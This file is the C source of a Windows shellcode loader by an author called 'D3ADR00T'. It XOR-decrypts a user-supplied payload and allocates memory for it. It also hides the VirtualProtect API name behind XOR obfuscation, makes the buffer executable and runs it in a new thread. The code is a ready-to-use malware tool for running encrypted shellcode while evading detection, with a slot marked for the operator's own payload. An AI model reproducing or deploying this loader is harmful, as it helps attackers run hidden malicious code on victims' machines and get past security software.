/* 
 author: D3ADR00T
	simple shellcode with xor encryption
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//pointer for virtualprotect
BOOL (WINAPI * pVirtualProtect) (
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {

	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0; 
	char key[] = "123"; //dont change this if you did you need to change  svirtualprotect
	char svirtualprotect [] ={ 0x67, 0x5b, 0x41, 0x45, 0x47, 0x52, 0x5d, 0x62, 0x41, 0x5e, 0x46, 0x56, 0x52, 0x46 };
	
	unsigned char payload[] = {/*put your shellcode here*/};
	unsigned int len = sizeof(payload);
	char key1[] = "bismA11@HA1RAHM@NALRahim"; //edit this with your key
	
	// Allocate buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	

	XOR((char *) svirtualprotect, strlen(svirtualprotect), key, sizeof(key));
	XOR((char *) payload, len, key1, sizeof(key1));
	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, len);
	//lets use the VirtualProtect pointer
	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"),svirtualprotect);
	
	// Make the buffer executable
	rv = pVirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	
	

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
